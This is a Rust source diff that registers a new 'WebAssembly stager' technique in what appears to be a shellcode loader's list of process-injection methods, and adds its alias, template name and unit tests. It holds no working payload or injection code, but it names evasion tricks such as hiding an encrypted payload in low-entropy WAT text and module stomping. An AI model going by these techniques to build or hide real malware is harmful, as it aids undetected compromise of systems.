@@ -82,6 +82,11 @@ pub enum Execution {
     /// Module stomping via low level APIs (overwrites a legit DLL .text)
     #[value(alias = "ntstomp", alias = "ntStomp")]
     NtModuleStomping,
+    /// WebAssembly (WAT) stager: wraps the encrypted payload in a
+    /// wasm module (low-entropy WAT text format) and reads it back out
+    /// at runtime before executing in-process. Self-injection technique.
+    #[value(alias = "ntwat", alias = "ntWat")]
+    NtWatStager,
 }
 
 impl Execution {
@@ -94,6 +99,7 @@ impl Execution {
                 | Execution::NtFiber
                 | Execution::SysFiber
                 | Execution::NtModuleStomping
+                | Execution::NtWatStager
         )
     }
 
@@ -109,6 +115,7 @@ impl Execution {
             Execution::SysFiber => "sysFIBER",
             Execution::EarlyCascade => "ntEarlyCascade",
             Execution::NtModuleStomping => "ntStomp",
+            Execution::NtWatStager => "ntWat",
         }
     }
 }
@@ -210,6 +217,7 @@ mod tests {
         assert!(Execution::NtFiber.is_self_injection());
         assert!(Execution::SysFiber.is_self_injection());
         assert!(Execution::NtModuleStomping.is_self_injection());
+        assert!(Execution::NtWatStager.is_self_injection());
 
         assert!(!Execution::NtCreateRemoteThread.is_self_injection());
         assert!(!Execution::SysCreateRemoteThread.is_self_injection());
@@ -224,6 +232,7 @@ mod tests {
         assert_eq!(format!("{}", Execution::NtQueueUserAPC), "ntAPC");
         assert_eq!(format!("{}", Execution::EarlyCascade), "ntEarlyCascade");
         assert_eq!(format!("{}", Execution::NtModuleStomping), "ntStomp");
+        assert_eq!(format!("{}", Execution::NtWatStager), "ntWat");
     }
 
     #[test]
@@ -245,5 +254,6 @@ mod tests {
         assert_eq!(Execution::NtCreateRemoteThread.template_name(), "ntCRT");
         assert_eq!(Execution::SysCreateRemoteThread.template_name(), "sysCRT");
         assert_eq!(Execution::NtModuleStomping.template_name(), "ntStomp");
+        assert_eq!(Execution::NtWatStager.template_name(), "ntWat");
     }
 }
